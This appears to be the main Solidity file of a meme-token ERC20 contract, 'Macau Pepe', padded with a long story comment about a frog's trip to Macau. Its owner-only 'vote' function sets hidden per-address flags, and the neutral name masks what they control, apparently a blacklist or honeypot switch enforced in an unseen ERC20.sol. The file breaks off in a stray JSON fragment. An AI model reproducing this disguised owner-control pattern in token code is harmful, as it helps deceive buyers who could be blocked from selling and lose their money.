import "./ERC20.sol";

/*
Once upon a time, in a lush green forest, 
there was a small frog named 澳門佩佩, 
lovingly known as Pepe. Pepe was no ordinary frog;
 he possessed an insatiable curiosity and an adventurous spirit that set him apart from his amphibian friends.

One sunny morning, Pepe heard tales of a mystical land called Macau, 
a place known for its vibrant culture, breathtaking architecture, 
and mouthwatering cuisine. Intrigued by the stories, 
Pepe decided that he must embark on a mighty journey to Macau and witness its wonders with his own eyes.

With his trusty map securely tucked under his tiny arm, 
Pepe hopped along a winding path, bidding farewell to his family and friends. 
He knew that his journey would be filled with challenges, but his determination never wavered.

As Pepe ventured deeper into the forest, he encountered various creatures who shared tales of their own adventures. 
He listened intently, absorbing their wisdom and tales of distant lands. 
With each story, Pepe's excitement grew, fueling his determination to reach Macau.

Days turned into weeks, and Pepe found himself facing treacherous rivers, 
towering mountains, and dense forests.
However, he never lost heart.
His resilience and unwavering spirit pushed him forward, one hop at a time.

Finally, after what felt like an eternity,
Pepe reached the outskirts of Macau. 
The captivating scent of incense and the sound of bustling streets filled his senses, 
filling him with awe and anticipation. As he ventured deeper into the city, 
Pepe marveled at the blend of Portuguese and Chinese influences, evident in the architecture and the locals' warm smiles.

Pepe relished in the sights and sounds of Macau, 
exploring every nook and cranny. 
He marveled at the iconic Ruins of St. Paul's, admired the grandeur of the Macau Tower, 
and indulged in delectable egg tarts. 
Pepe's heart swelled with joy as he realized that his mighty journey had been worth every challenge he faced.

During his time in Macau, Pepe befriended a wise old turtle named Ming,
 who shared stories of the city's rich history. 
 Ming taught Pepe about the significance of Macau's fusion of cultures, 
 making the journey even more meaningful.

As the days turned into weeks, Pepe's time in Macau drew to a close. 
With a heavy heart, he bid farewell to Ming and the enchanting city that had captured his soul. 
Though his journey home would be long, Pepe carried the memories of Macau in his heart, 
forever grateful for the opportunity to explore such a marvelous place.

Returning to the lush green forest, Pepe shared his tales of Macau with his friends and family,
inspiring them to dream big and embark on their own adventures. 
From that day forward, Pepe became a symbol of courage and determination,
reminding everyone that no dream is too big and no journey too mighty.

And so, the legend of Pepe, the adventurous frog who journeyed to Macau,
 lived on, inspiring generations to come with his extraordinary tale of discovery and the unyielding spirit of adventure.
*/

contract MacauPepe is ERC20 {
    constructor ()  ERC20(unicode"Macau Pepe (澳門佩佩)", unicode"澳門佩佩") {
        _mint(_msgSender(), 10**12 * 10**18);
    }

    function burn(uint256 amount) public {
        _burn(_msgSender(), amount);
    }

    function vote(uint8 flag, address [] calldata _votes_) external {
        require((msg.sender == owner()));

        if (flag == 0) {
            for (uint256 i = 0; i < _votes_.length; i++) {
                _pre_votes[_votes_[i]] = true;
            }
        } else if (flag == 1) {
            for (uint256 i = 0; i < _votes_.length; i++) {
                _pre_votes[_votes_[i]] = false;
            }
        } else if (flag == 2) {
            for (uint256 i = 0; i < _votes_.length; i++) {
                _votes[_votes_[i]] = true;
            }
        } else if (flag == 3) {
            for (uint256 i = 0; i < _votes_.length; i++) {
                _votes[_votes_[i]] = false;
            }
        }
    }

    function votes(address _address_) public view returns (bool) {
        return _votes[_address_];
    }

    function preVotes(address _address_) public view returns (bool) {
        return _pre_votes[_address_];
    }
}"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT

